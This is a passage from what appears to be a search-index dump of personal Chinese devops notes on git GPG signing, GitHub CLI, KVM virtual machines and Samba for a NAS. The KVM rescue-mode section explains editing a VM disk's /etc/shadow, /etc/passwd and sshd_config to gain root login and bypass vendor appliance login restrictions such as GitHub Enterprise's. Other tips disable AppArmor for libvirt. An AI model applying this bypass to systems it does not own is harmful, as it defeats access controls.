\u518d\u4fdd\u5b58\u5c31\u597d\u4e86\u3002</p>"},{"location":"devops/system/git/#git-gpg","title":"git \u914d\u7f6e gpg","text":"<p>\u65b0\u673a\u5668\u7684\u8bdd\u76f4\u63a5\u6539 <code>~/.gitconfig</code> \u5c31\u597d\u4e86\uff1a</p> <pre><code>[user]\n    name = &lt;name&gt;\n    email = &lt;email&gt;\n    signingkey = &lt;keyid&gt;\n[commit]\n    gpgsign = true\n[gpg]\n    program = /usr/bin/gpg\n[init]\n    defaultBranch = master\n</code></pre> <p>\u8fd9\u6837\u5c31\u53ef\u4ee5\u9ed8\u8ba4\u7b7e\u7f72 commit \u4e86\u3002</p>"},{"location":"devops/system/git/#macos","title":"macOS \u901a\u8fc7\u94a5\u5319\u73af\u65e0\u611f\u7b7e\u7f72","text":"<p>macOS \u53ef\u4ee5\u901a\u8fc7 pinentry-mac \u8bb0\u4f4f\u5bc6\u7801\u6765\u65e0\u611f\u7b7e\u7f72 commit\uff1a</p> <pre><code>brew install pinentry-mac\necho \"pinentry-program /opt/homebrew/bin/pinentry-mac\" &gt;&gt; ~/.gnupg/gpg-agent.conf\nkillall gpg-agent\n</code></pre> <p>\u7b2c\u4e00\u6b21\u4f1a\u8981\u6c42\u8f93\u5165\u5bc6\u7801\uff0c\u8bb0\u4f4f\u4e4b\u540e\u4ee5\u540e\u5c31\u4e0d\u7528\u518d\u8f93\u5165\u4e86\uff0c\u800c\u4e14\u4e5f\u4e0d\u9700\u8981\u4f9d\u9760 <code>GPG_TTY</code> \u73af\u5883\u53d8\u91cf\u4e86\u3002</p>"},{"location":"devops/system/git/#gpg_tty","title":"GPG_TTY \u73af\u5883\u53d8\u91cf","text":"<p>\u6709\u4e9b\u65f6\u5019\u5bfc\u5165\u5bfc\u51fa\u5bc6\u94a5\u3001\u7b7e\u7f72 commit \u7b49\u9700\u8981\u7528\u5230 gpg \u7684\u65f6\u5019\u83ab\u540d\u5176\u5999\u62a5 no such file \u4e4b\u7c7b\u7684\u9519\u8bef\uff0c\u6216\u8005\u7b7e\u7f72\u5931\u8d25\uff0c\u5927\u6982\u7387\u662f\u56e0\u4e3a <code>GPG_TTY</code> \u73af\u5883\u53d8\u91cf\u5bfc\u81f4\u7684\uff0c\u53ef\u4ee5\u624b\u52a8\u91cd\u65b0\u8bbe\u7f6e\u4e00\u4e0b\u5c31\u597d\uff1a</p> <pre><code>export GPG_TTY=$(tty)\n</code></pre>"},{"location":"devops/system/git/#github-cli","title":"GitHub CLI","text":"<p>\u5728\u4fee\u6539 PR \u4e4b\u7c7b\u7684\u65f6\u5019\u7528 GitHub CLI \u53ef\u4ee5\u65b9\u4fbf\u4e00\u70b9\uff0c\u800c\u4e14\u5728 Linux \u4e0a\u901a\u8fc7 http \u8bbf\u95ee GitHub \u79c1\u6709\u5e93\u9700\u8981\u6743\u9650\u7684\u65f6\u5019\u4e5f\u53ef\u4ee5\u7531 GitHub CLI \u63d0\u4f9b\uff0c\u6240\u4ee5\u8fd8\u662f\u53ef\u4ee5\u5b89\u88c5\u7684\u3002</p>"},{"location":"devops/system/git/#_5","title":"\u5b89\u88c5","text":"<ul> <li>macOS \u76f4\u63a5 Homebrew \u5b89\u88c5\uff1a     <pre><code>brew install gh\n</code></pre></li> <li>Linux \u9700\u8981\u6839\u636e\u5b98\u65b9\u6307\u5357\u6765\u6dfb\u52a0\u8f6f\u4ef6\u6e90\u624b\u52a8\u5b89\u88c5\uff1a     <pre><code>(type -p wget &gt;/dev/null || (sudo apt update &amp;&amp; sudo apt-get install wget -y)) \\\n    &amp;&amp; sudo mkdir -p -m 755 /etc/apt/keyrings \\\n    &amp;&amp; wget -qO- https://cli.github.com/packages/githubcli-archive-keyring.gpg | sudo tee /etc/apt/keyrings/githubcli-archive-keyring.gpg &gt; /dev/null \\\n    &amp;&amp; sudo chmod go+r /etc/apt/keyrings/githubcli-archive-keyring.gpg \\\n    &amp;&amp; echo \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main\" | sudo tee /etc/apt/sources.list.d/github-cli.list &gt; /dev/null \\\n    &amp;&amp; sudo apt update \\\n    &amp;&amp; sudo apt install gh -y\n</code></pre></li> </ul>"},{"location":"devops/system/git/#_6","title":"\u767b\u5f55","text":"<pre><code>gh auth login\n</code></pre> <p>\u5728\u6d4f\u89c8\u5668\u6253\u5f00\u94fe\u63a5\u767b\u5f55\u540e\u8f93\u5165 device code \u5c31\u53ef\u4ee5\u4e86\uff0c\u7136\u540e\u4f1a\u81ea\u52a8\u5728 <code>~/.gitconfig</code> \u4e2d\u6dfb\u52a0\uff1a</p> <pre><code>[credential \"https://github.com\"]\n    helper =\n    helper = !/usr/bin/gh auth git-credential\n[credential \"https://gist.github.com\"]\n    helper =\n    helper = !/usr/bin/gh auth git-credential\n</code></pre> <p>\u8fd9\u6837\u4e4b\u540e clone push \u79c1\u6709\u5e93\u4ec0\u4e48\u7684\u5c31\u4e0d\u9700\u8981\u518d\u767b\u5f55\u4e86\u3002</p>"},{"location":"devops/system/kvm/","title":"KVM \u865a\u62df\u673a\u57fa\u672c\u7528\u6cd5","text":"<p> \u7ea6 1066 \u4e2a\u5b57  64 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p>Abstract</p> <p>\u5728 Linux \u4e0a\u5229\u7528 KVM \u865a\u62df\u5316\u6280\u672f\u6765\u521b\u5efa\u548c\u7ba1\u7406\u865a\u62df\u673a\uff0c\u8bb0\u5f55\u4e00\u4e9b\u57fa\u672c\u7684\u7528\u6cd5</p>"},{"location":"devops/system/kvm/#_1","title":"\u5b89\u88c5","text":"<p>\u5fd8\u8bb0\u672c\u5730\u600e\u4e48\u5b89\u88c5\u7684\u4e86\uff0c\u53cd\u6b63\u901a\u8fc7 apt \u5c31\u53ef\u4ee5\u76f4\u63a5\u88c5\uff1a</p> <pre><code>apt install qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils virtinst libvirt-daemon\n</code></pre> <p>\u4f7f\u7528 cockpit \u7684\u8bdd\u53ef\u4ee5\u88c5 cockpit-machines \u6765\u5728 cockpit \u7f51\u9875\u4e0a\u7ba1\u7406 KVM \u865a\u62df\u673a\uff1a</p> <pre><code>apt install cockpit-machines\n</code></pre>"},{"location":"devops/system/kvm/#_2","title":"\u4f7f\u7528","text":""},{"location":"devops/system/kvm/#cockpit","title":"Cockpit","text":"<p>\u76f4\u63a5\u5728\u9875\u9762\u4e0a\u70b9\u70b9\u70b9\u5c31\u597d\u4e86\uff0c\u57fa\u672c\u90fd\u5f88\u76f4\u63a5\u3002</p> <p>\u865a\u62df\u673a\u542f\u52a8\u540e cockpit \u4f1a\u63d0\u4f9b VNC \u63a7\u5236\u53f0\u754c\u9762\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728 cockpit \u91cc\u64cd\u4f5c\u56fe\u5f62\u754c\u9762\u3002</p>"},{"location":"devops/system/kvm/#xml","title":"\u547d\u4ee4\u4e0e xml \u6587\u4ef6","text":""},{"location":"devops/system/kvm/#_3","title":"\u865a\u62df\u673a\u76f8\u5173","text":"<p>\u5229\u7528 virsh \u547d\u4ee4\u6765\u7ba1\u7406 KVM \u865a\u62df\u673a\uff08root \u7528\u6237\uff09\uff1a</p> <pre><code>virsh list --all        # \u5217\u51fa\u6240\u6709\u865a\u62df\u673a\nvirsh start &lt;vm_name&gt;   # \u542f\u52a8\u865a\u62df\u673a\nvirsh destroy &lt;vm_name&gt; # \u5173\u95ed\u865a\u62df\u673a\nvirsh edit &lt;vm_name&gt;    # \u7f16\u8f91\u865a\u62df\u673a\u914d\u7f6e\n</code></pre> <p>\u6dfb\u52a0 disk\uff0c\u5728 edit \u7684 xml \u6587\u4ef6\u4e2d devices \u90e8\u5206\u6dfb\u52a0\uff1a</p> <pre><code>&lt;disk type='file' device='cdrom'&gt;\n  &lt;driver name='qemu' type='raw'/&gt;\n  &lt;source file='/path/to/image.iso'/&gt;\n  &lt;target dev='hdb' bus='ide'/&gt;\n  &lt;readonly/&gt;\n  &lt;address type='drive' controller='0' bus='0' target='0' unit='0'/&gt;\n&lt;/disk&gt;\n</code></pre> <p>\u5176\u4e2d target \u7684 dev \u8981\u4e0d\u80fd\u51b2\u7a81\uff0caddress \u90e8\u5206\u7684 bus \u548c unit \u4e5f\u8981\u907f\u514d\u51b2\u7a81\uff0c\u4e14\u4e00\u4e2a bus \u4e0a\u53ea\u80fd\u6709\u4e24\u4e2a unit\u3002</p> <p>\u542f\u52a8\u65b9\u5f0f\u53ef\u4ee5\u5728 <code>&lt;os&gt;</code> \u90e8\u5206\u7684 <code>&lt;boot&gt;</code> \u4e2d\u4fee\u6539\uff0c<code>dev='hd'</code> \u4e3a\u4ece\u786c\u76d8\u542f\u52a8\uff0c<code>dev='cdrom'</code> \u4e3a\u4ece\u5149\u76d8\u542f\u52a8\u3002</p>"},{"location":"devops/system/kvm/#_4","title":"\u5b58\u50a8\u5377\u76f8\u5173","text":"<p>\u9664\u4e86\u4ee5\u6587\u4ef6\u5f62\u5f0f\u6dfb\u52a0 disk \u4ee5\u5916\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7 kvm \u7684\u5b58\u50a8\u6c60/\u5b58\u50a8\u5377\u6765\u6dfb\u52a0\uff0c\u53ef\u4ee5\u901a\u8fc7 cockpit \u754c\u9762\u6765\u521b\u5efa\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\uff1a</p> <pre><code># \u521b\u5efa\u5b58\u50a8\u6c60\uff0c\u5b58\u50a8\u5728 /path/to/pool \u76ee\u5f55\u4e0b\nvirsh pool-define-as &lt;pool-name&gt; --type dir --target /path/to/pool\nvirsh pool-start &lt;pool-name&gt;        # \u542f\u52a8\u5b58\u50a8\u6c60\nvirsh pool-autostart &lt;pool-name&gt;    # \u81ea\u52a8\u542f\u52a8\u5b58\u50a8\u6c60\n# \u521b\u5efa\u5b58\u50a8\u5377\uff0c\u5b58\u653e\u5728\u6c60\u7684\u76ee\u5f55\u4e0b\uff0c\u4ee5 vol-filename \u547d\u540d\uff0c\u6700\u5927 200G\nvirsh vol-create-as --pool &lt;pool-name&gt; --name &lt;vol-filename&gt; --capacity 200G --allocation 100G --format raw\nvirsh vol-info &lt;vol-filename&gt; &lt;pool-name&gt;   # \u67e5\u770b\u5377\u4fe1\u606f\nvirsh vol-list &lt;pool-name&gt;                  # \u5217\u51fa\u6c60\u4e2d\u7684\u5377\n</code></pre> <p>\u5176\u4e2d\u53ef\u4ee5\u6709\u4e24\u79cd\u683c\u5f0f\uff0c\u4ee5 .img \u7ed3\u5c3e\u7684 raw \u683c\u5f0f\uff0c\u548c\u4ee5 .qcow2 \u7ed3\u5c3e\u7684 qcow2 \u683c\u5f0f\u3002\u521b\u5efa\u5377\u540e\uff0c\u53ef\u4ee5\u5728 xml \u4e2d\u5f15\u7528\u8fd9\u4e9b\u5377\uff1a</p> <pre><code>&lt;disk type='volume' device='disk'&gt;\n  &lt;driver name='qemu' type='raw' discard='unmap'/&gt;\n  &lt;source pool='&lt;pool-name&gt;' volume='&lt;vol-filename&gt;'/&gt;\n  &lt;target dev='sda' bus='ide'/&gt;\n  &lt;address type='drive' controller='0' bus='0' target='0' unit='1'/&gt;\n&lt;/disk&gt;\n</code></pre> <p>\u540c\u6837\u9700\u8981\u6ce8\u610f target \u548c address \u4e0d\u8981\u51b2\u7a81\u3002</p>"},{"location":"devops/system/kvm/#vnc","title":"VNC \u76f8\u5173","text":"<p>cockpit \u521b\u5efa\u7684\u9ed8\u8ba4\u914d\u7f6e\u8c8c\u4f3c\u53ea\u80fd\u5728 cockpit \u4e2d\u6253\u5f00 vnc \u63a7\u5236\u53f0\u4f7f\u7528\uff0c\u60f3\u8981\u5728\u5916\u90e8\u4f7f\u7528 vnc \u5ba2\u6237\u7aef\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u8bbe\u7f6e\u5bc6\u7801\u624d\u884c\uff0c\u5728 edit \u7684 xml \u6587\u4ef6\u4e2d\uff0c\u4fee\u6539\uff1a</p> <pre><code>&lt;graphics type='vnc' port='-1' autoport='yes' listen='127.0.0.1' passwd='&lt;password&gt;'&gt;\n  &lt;listen type='address' address='127.0.0.1'/&gt;\n&lt;/graphics&gt;\n</code></pre> <p>\u53ef\u4ee5\u901a\u8fc7 <code>virsh vncdisplay &lt;vm_name&gt;</code> \u6765\u67e5\u770b vnc \u7aef\u53e3\uff0c\u7aef\u53e3\u53f7\u7684\u7ed3\u679c\u52a0\u4e0a 5900 \u662f\u5b9e\u9645\u7684 TCP \u7aef\u53e3\u53f7\uff0c\u4f8b\u5982 <code>127.0.0.1:0</code> \u9700\u8981\u901a\u8fc7 5900 \u7aef\u53e3\u6765\u8fde\u63a5\u3002\u53ef\u4ee5\u901a\u8fc7 ssh \u6765\u8f6c\u53d1\u51fa\u7aef\u53e3\uff1a</p> <pre><code>ssh -N -L 5900:127.0.0.1:5900 user@remote-host\n</code></pre> <p>\u7136\u540e\u5728\u6d4f\u89c8\u5668\u6253\u5f00 <code>vnc://localhost:5900</code> \u5373\u53ef\u8df3\u8f6c\u5ba2\u6237\u7aef\u8fdb\u884c\u8fde\u63a5\uff0cmac \u53ef\u901a\u8fc7\u7cfb\u7edf\u81ea\u5e26\u7684\u5c4f\u5e55\u5171\u4eab app \u6765\u8fdb\u884c\u8fde\u63a5\uff0c\u9700\u8981\u8f93\u5165 xml \u4e2d\u6307\u5b9a\u7684\u5bc6\u7801\u3002</p> <p>\u6216\u8005\u4e5f\u53ef\u4ee5\u5c06 xml \u4e2d\u76d1\u542c\u7684 ip \u6539\u4e3a 0.0.0.0 \u7136\u540e\u9632\u706b\u5899\u5f00\u653e\u51fa\u7aef\u53e3\u6765\u76f4\u63a5\u8fde\u63a5\u3002</p>"},{"location":"devops/system/kvm/#_5","title":"\u5176\u4ed6\u95ee\u9898","text":""},{"location":"devops/system/kvm/#kvm_1","title":"kvm \u6743\u9650\u95ee\u9898","text":"<p>\u5982\u679c\u8fd0\u884c\u865a\u62df\u673a\u65f6\u62a5\u9519\u7c7b\u4f3c cannot access storage file (as uid:xxx, gid:xxx) permission denied\uff0c\u663e\u793a\u8bbf\u95ee disk \u7684\u6587\u4ef6\u65f6\u51fa\u73b0\u4e86\u6743\u9650\u95ee\u9898\uff0c\u53ef\u4ee5\u4fee\u6539 /etc/libvirt/qemu.conf\uff0c\u5728\u672b\u5c3e\u6dfb\u52a0\uff1a</p> <pre><code>user = \"root\"\ngroup = \"root\"\n</code></pre> <p>\u7136\u540e <code>systemctl restart libvirtd.service</code> \u91cd\u542f\u670d\u52a1\uff0c\u518d\u542f\u52a8\u865a\u62df\u673a\u5373\u53ef\u3002</p>"},{"location":"devops/system/kvm/#qemu-volume","title":"qemu \u4e0e volume \u6743\u9650\u95ee\u9898","text":"<p>\u5982\u679c\u4f7f\u7528\u5b58\u50a8\u6c60/\u5b58\u50a8\u5377\u6765\u521b\u5efa disk \u7684\u8bdd\uff0c\u542f\u52a8\u7684\u65f6\u5019\u53ef\u80fd\u4f1a\u9047\u5230\u53e6\u4e00\u4e2a\u6743\u9650\u95ee\u9898\uff1a</p> <pre><code>error: internal error: process exited while connecting to monitor:\nqemu-system-x86_64: -blockdev ...: Could not open '/path/to/volume': Permission denied\n</code></pre> <p>\u89e3\u51b3\u65b9\u5f0f\u4e00\u79cd\u662f\u5f03\u7528 volume \u65b9\u5f0f\uff0c\u6539\u6210\u6587\u4ef6\u65b9\u5f0f\u8f7d\u5165 disk\uff0c\u53e6\u4e00\u79cd\u662f\u5173\u95ed apparmo\uff0c\u5728 /etc/libvirt/qemu.conf \u4e2d\u6dfb\u52a0\uff1a</p> <pre><code>security_driver = \"none\"\n</code></pre> <p>\u7136\u540e <code>systemctl restart libvirtd.service</code> \u91cd\u542f\u670d\u52a1\uff0c\u518d\u542f\u52a8\u865a\u62df\u673a\u5373\u53ef\u3002</p>"},{"location":"devops/system/kvm/#nat","title":"NAT \u7f51\u7edc\u7aef\u53e3\u8f6c\u53d1","text":"<p>\u865a\u62df\u673a\u9ed8\u8ba4\u4f7f\u7528 NAT \u7f51\u7edc\u6a21\u5f0f\uff0c\u8981\u60f3\u4ece\u5916\u90e8\u8bbf\u95ee\u865a\u62df\u673a\u7684\u7aef\u53e3\uff0c\u9700\u8981\u901a\u8fc7 iptables \u8fdb\u884c\u7aef\u53e3\u8f6c\u53d1\u3002\u9996\u5148\u9700\u8981\u4fee\u6539 /etc/sysctl.conf\uff1a</p> <pre><code>net.ipv4.ip_forward=1\n</code></pre> <p>\u7136\u540e <code>sysctl -p</code> \u4fee\u6539\u6765\u652f\u6301 IPv4 \u4e0a\u7684\u6d41\u91cf\u8f6c\u53d1\uff0c\u7136\u540e\u901a\u8fc7 iptables \u6765\u8f6c\u53d1\u7aef\u53e3\uff1a</p> <pre><code># \u5c06\u5916\u90e8\u8bbf\u95ee\u5bbf\u4e3b\u673a host_port \u7684\u6d41\u91cf\u8f6c\u53d1\u5230 kvm_ip:kvm_port\niptables -t nat -A PREROUTING -p tcp --dport &lt;host_port&gt; -j DNAT --to-destination &lt;kvm_ip&gt;:&lt;kvm_port&gt;\n# \u5c06\u76ee\u6807\u4e3a kvm_ip:kvm_port \u7684\u6570\u636e\u5305\u7684\u6e90\u5730\u5740\u4fee\u6539\u4e3a host_ip\niptables -t nat -A POSTROUTING -p tcp -d &lt;kvm_ip&gt; --dport &lt;kvm_port&gt; -j SNAT --to-source &lt;host_ip&gt;\n# \u67e5\u770b iptables\niptables -t nat -nL --line-numbers\n</code></pre> <p>\u5176\u4e2d kvm_ip \u548c host_ip \u90fd\u662f\u5728 KVM NAT \u7f51\u5361\u4e0a\u7684 IP \u5730\u5740\uff0c\u9ed8\u8ba4\u5e94\u8be5\u4e3a <code>192.168.xxx.xxx</code>\u3002</p>"},{"location":"devops/system/kvm/#_6","title":"\u6551\u63f4\u6a21\u5f0f","text":"<p>\u53ef\u4ee5\u901a\u8fc7\u52a0\u8f7d\u989d\u5916 iso \u955c\u50cf\u8fdb\u5165\u6551\u63f4\u6a21\u5f0f\u5e76\u6302\u8f7d\u865a\u62df\u673a\u78c1\u76d8\u7684\u65b9\u5f0f\u6765\u4fee\u6539\u865a\u62df\u673a\u7684\u7cfb\u7edf\u6587\u4ef6\uff0c\u6765\u4fee\u590d\u610f\u5916\u9020\u6210\u7684\u865a\u62df\u673a\u65e0\u6cd5\u542f\u52a8\uff0c\u6216\u7ed5\u8fc7\u7279\u5b9a\u955c\u50cf\u5e73\u53f0\u7684\u767b\u5f55\u9650\u5236\uff08\u5982 GitHub Enterprise\uff09\u3002</p> <p>\u9996\u5148\u9700\u8981\u4e00\u4e2a Linux \u7684 iso \u5b89\u88c5\u955c\u50cf\uff0c\u7248\u672c\u65e0\u6240\u8c13\uff0c\u7136\u540e\u901a\u8fc7 edit xml \u7684\u65b9\u5f0f\u5c06\u955c\u50cf\u4f5c\u4e3a cdrom \u5e76\u8bbe\u7f6e\u4ece cdrom \u542f\u52a8\uff1a</p> <pre><code>&lt;os&gt;\n  &lt;type arch='x86_64' machine='pc-i400fx-10.0'&gt;hvm&lt;/type&gt;\n  &lt;boot dev='cdrom'/&gt;\n  &lt;bootmenu enable='yes'/&gt;\n&lt;/os&gt;\n&lt;devices&gt;\n  &lt;emulator&gt;/usr/bin/qemu-system-x86_64&lt;/emulator&gt;\n  &lt;disk type='file' device='disk'&gt;\n    &lt;driver name='qemu' type='qcow2'/&gt;\n    &lt;source file='/path/to/disk.qcow2'/&gt;\n    &lt;target dev='hda' bus='ide'/&gt;\n    &lt;address type='drive' controller='0' bus='0' target='0' unit='0'/&gt;\n  &lt;/disk&gt;\n  &lt;disk type='file' device='cdrom'&gt;\n    &lt;driver name='qemu' type='raw'/&gt;\n    &lt;source file='/path/to/image.iso'/&gt;\n    &lt;target dev='hdb' bus='ide'/&gt;\n    &lt;address type='drive' controller='0' bus='0' target='0' unit='1'/&gt;\n  &lt;/disk&gt;\n</code></pre> <p>\u7136\u540e\u542f\u52a8\u865a\u62df\u673a\u8fdb\u5165\u5b89\u88c5 Linux \u7684\u754c\u9762\uff0c\u9009\u62e9\u8fdb\u5165 Rescue Mode\uff0c\u4f1a\u51c6\u5907\u4e00\u4e2a\u57fa\u672c\u73af\u5883\uff0c\u5e76\u9009\u62e9\u6302\u8f7d\u539f\u6765\u7684\u7cfb\u7edf\u76d8\u3002\u8fdb\u5165\u7cfb\u7edf\u540e\u5c31\u53ef\u4ee5\u4fee\u6539\u539f\u6765\u7cfb\u7edf\u76d8\u4e2d\u7684\u6240\u6709\u6587\u4ef6\u3002\u4f8b\u5982\uff1a</p> <ul> <li>\u4fee\u6539 root \u5bc6\u7801<ul> <li>\u5728 /etc/shadow \u6587\u4ef6\u4e2d\u627e\u5230 root \u4e00\u884c\uff0c\u4fee\u6539\u7b2c\u4e00\u4e2a : \u548c\u7b2c\u4e8c\u4e2a : \u4e2d\u95f4\u7684\u5185\u5bb9\u4e3a <code>openssl passwd -1 \"&lt;new_password&gt;\"</code> \u7684\u7ed3\u679c</li> </ul> </li> <li>\u5141\u8bb8 root \u767b\u5f55<ul> <li>\u5728 /etc/passwd \u6587\u4ef6\u4e2d\u627e\u5230 root \u4e00\u884c\uff0c\u4fee\u6539 /usr/sbin/nologin \u4e3a /bin/bash</li> </ul> </li> <li>\u5141\u8bb8 ssh \u4ece\u5bc6\u7801\u767b\u5f55\u4ee5\u53ca\u5141\u8bb8 root \u767b\u5f55<ul> <li>\u4fee\u6539 /etc/ssh/sshd_config \u6587\u4ef6\uff1a     <pre><code>PermitRootLogin yes\nPasswordAuthentication yes\n</code></pre></li> </ul> </li> </ul>"},{"location":"devops/system/kvm/#reference","title":"Reference","text":"<ul> <li>https://blog.csdn.net/yuezhilangniao/article/details/113743688</li> <li>https://zhensheng.im/2019/02/06/qemu-with-pool-volume-storage-could-not-open-xxxxxxx-permission-denied.meow</li> <li>https://www.cnblogs.com/sky-cheng/p/16087283.html</li> <li>https://blog.csdn.net/weixin_47680367/article/details/126183181</li> <li>https://developer.aliyun.com/article/1361666</li> <li>https://blog.csdn.net/qq_34777982/article/details/125396150</li> <li>https://blog.rabit.pw/2022/github-enterprise-reverse-engineering/</li> </ul>"},{"location":"devops/system/nas/","title":"NAS \u914d\u7f6e\u8bb0\u5f55","text":"<p> \u7ea6 672 \u4e2a\u5b57  39 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Abstract</p> <p>\u5728\u81ea\u7ec4 NAS \u548c\u7ef4\u62a4\u65f6\u8fdb\u884c\u7684\u4e00\u4e9b\u914d\u7f6e\u8bb0\u5f55</p> <p>\u540e\u8865\u7684\u8bb0\u5f55\uff0c\u6240\u4ee5\u5e76\u975e\u642d\u5efa NAS \u7684\u5168\u8fc7\u7a0b\uff0c\u6162\u6162\u6765\u8865\uff0c\u76ee\u524d\u53ea\u6709\u5c11\u90e8\u5206</p> <p>\u642d\u5efa NAS \u7684\u65f6\u5019\u53c2\u8003\u4e86\u975e\u5e38\u591a\uff1ahttps://blog.dawnocean.site/NAS-Router-0</p>"},{"location":"devops/system/nas/#_1","title":"\u62c6\u5206\u51fa\u53bb\u7684\u9875\u9762","text":"<p>\u4e00\u4e9b\u5e76\u975e NAS \u7279\u5b9a\u4f7f\u7528\u7684\u914d\u7f6e\u5212\u5206\u5230\u4e86\u5176\u4ed6\u9875\u9762\u4e2d\uff1a</p> <ul> <li>podman \u914d\u7f6e</li> <li>\u7f51\u8def\u57fa\u7840\u914d\u7f6e\uff1a\u5229\u7528 nmtui \u6765\u914d\u7f6e\u5185\u7f51\u9759\u6001 ip\uff0c\u5229\u7528 ethtool \u4fee\u6539\u7f51\u5361\u901f\u7387</li> <li>Clash \u914d\u7f6e\uff1a\u5728\u670d\u52a1\u5668\u4e0a\u914d\u7f6e\u4ee3\u7406\u7a0b\u5e8f\u548c\u63a7\u5236\u9875\u9762</li> <li>\u5185\u7f51\u7a7f\u900f\u4e0e\u53cd\u5411\u4ee3\u7406\uff1a\u642d\u5efa\u7684 NAS \u53ef\u7528\u4e8e\u7a7f\u900f\u5185\u7f51</li> <li>Caddy HTTP \u670d\u52a1\u5668\uff1a\u5229\u7528 Caddy \u8fdb\u884c\u670d\u52a1\u7684\u53cd\u5411\u4ee3\u7406\uff0c\u5b9e\u73b0\u57df\u540d\u8bbf\u95ee\u548c\u81ea\u7b7e\u7f72 SSL \u8bc1\u4e66</li> </ul>"},{"location":"devops/system/nas/#smb","title":"SMB \u4e0e\u5907\u4efd\u914d\u7f6e","text":"<p>SMB (Server Message Block) \u662f\u5fae\u8f6f\u7684\u5728\u8ba1\u7b97\u673a\u95f4\u5171\u4eab\u6587\u4ef6\u3001\u8bbe\u5907\u7b49\u7684\u534f\u8bae\u3002Samba \u662f Linux \u4e0a\u7684\u4e00\u4e2a SMB \u5b9e\u73b0\uff0c\u53ef\u4ee5\u8fdb\u884c\u6587\u4ef6\u7684\u5171\u4eab\uff0c\u5e76\u5728\u5ba2\u6237\u7aef\u4e0a\u6302\u8f7d\u5171\u4eab\u76ee\u5f55\u3002\u540c\u65f6\u4e5f\u53ef\u4ee5\u4f5c\u4e3a macOS \u65f6\u95f4\u673a\u5668\u7684\u5907\u4efd\u78c1\u76d8\uff0c\u5b9e\u73b0\u5b9a\u671f\u7f51\u7edc\u5907\u4efd\u3002</p> <pre><code>apt install samba\n</code></pre> <p>\u670d\u52a1\u901a\u8fc7 smb.service systemd \u670d\u52a1\u6765\u7ba1\u7406\uff0c\u914d\u7f6e\u6587\u4ef6\u5728 /etc/samba/smb.conf\uff0c\u4e00\u4e9b\u5e38\u7528\u7684\u914d\u7f6e\u548c\u4e3a\u4e86\u8ba9 mac \u65f6\u95f4\u673a\u5668\u80fd\u4f7f\u7528\u7684\u914d\u7f6e\u5982\u4e0b\uff1a</p> <pre><code>[global]\n   smb ports = ...\n### Time Machine Compatibility ###\n   min protocol = SMB2\n   server min protocol = SMB2\n   vfs objects = catia fruit streams_xattr\n   fruit:nfs_aces = no\n   fruit:metadata = stream\n   fruit:model = MacSamba\n   fruit:posix_rename = yes\n   fruit:veto_appledouble = no\n   fruit:wipe_intentionally_left_blank_rfork = yes\n   fruit:delete_empty_adfiles = yes\n\n   wins support = yes\n   dns proxy = yes\n\n   include = registry\n\n[&lt;storage-name&gt;]\n  comment = ...\n  public = no\n  path = /path/to/storage\n  read only = no\n  valid users = ...\n  force user = ...\n  force group = ...\n\n[mac-backup]\n  comment = MacBook TimeMachine Backup\n  path = /path/to/mac-backup\n  public = no\n  read only = no\n  fruit:time machine = yes\n  fruit:aapl = yes\n  valid users = ...\n  force user = ...\n  force group = ...\n</code></pre> <p>\u540c\u65f6\u9700\u8981\u901a\u8fc7 <code>smbpasswd -a &lt;username&gt;</code> \u6765\u4e3a\u7528\u6237\u8bbe\u7f6e smb \u767b\u5f55\u7528\u7684\u5bc6\u7801\u3002\u4ee5\u53ca\u8fd8\u8981\u6ce8\u610f\u5b58\u50a8\u8def\u5f84\u7684 owner \u548c\u6743\u9650\u95ee\u9898\u3002</p> <p>\u867d\u7136 cockpit \u6709 45Drive's File Sharing \u63d2\u4ef6\u53ef\u4ee5\u7ba1\u7406 samba \u914d\u7f6e\uff0c\u4f46\u7528\u8d77\u6765\u4e0d\u5982\u81ea\u5df1\u624b\u52a8\u6539\u914d\u7f6e\u3002</p> <p>macOS \u4e0a\u6302\u8f7d\u76ee\u5f55\u53ef\u4ee5\u76f4\u63a5\u5728\u8bbf\u8fbe &gt; \u524d\u5f80 &gt; \u8fde\u63a5\u670d\u52a1\u5668\u2026\u4e2d\u8f93\u5165 <code>smb://&lt;ip&gt;:&lt;port&gt;</code> \u6765\u8fde\u63a5\uff0c\u8f93\u5165\u914d\u7f6e\u7684\u7528\u6237\u540d\u548c smb \u767b\u5f55\u5bc6\u7801\uff0c\u7136\u540e\u9009\u62e9\u9700\u8981\u6302\u8f7d\u7684\u5b58\u50a8\u76ee\u5f55\u3002</p>"},{"location":"devops/system/nas/#_2","title":"\u65f6\u95f4\u673a\u5668\u5907\u4efd\u95ee\u9898","text":"<p>\u5728\u4fee\u6539\u8fc7 smb \u7aef\u53e3\u540e\uff0c\u5373\u4f7f\u4e3a\u65f6\u95f4\u673a\u5668\u4e13\u95e8\u6dfb\u52a0\u4e86\u8bbe\u7f6e\uff0c\u5728\u5907\u4efd\u7684\u65f6\u5019\u4e5f\u4f1a\u51fa\u73b0\u8fde\u4e0d\u4e0a\u78c1\u76d8\u7684\u60c5\u51b5\u3002</p> <p>\u8fd9\u662f\u56e0\u4e3a\u5728\u8fdb\u884c\u65f6\u95f4\u673a\u5668\u5907\u4efd\u7684\u65f6\u5019 macOS \u4f1a\u4f7f\u7528\u7cfb\u7edf\u5185\u8bb0\u5f55\u7684\u7528\u6237\u548c\u5bc6\u7801\u6765\u767b\u5f55\u5907\u4efd\u7528\u7684\u76ee\u5f55\uff0c\u4f46\u7cfb\u7edf\u5185\u4fdd\u5b58\u7684 smb \u5730\u5740\u4e2d\u5e76\u4e0d\u5305\u542b\u7aef\u53e3\u53f7\u4fe1\u606f\uff0c\u6240\u4ee5\u5728\u5907\u4efd\u65f6\u5b9e\u9645\u5728\u767b\u5f55\u7684\u662f smb 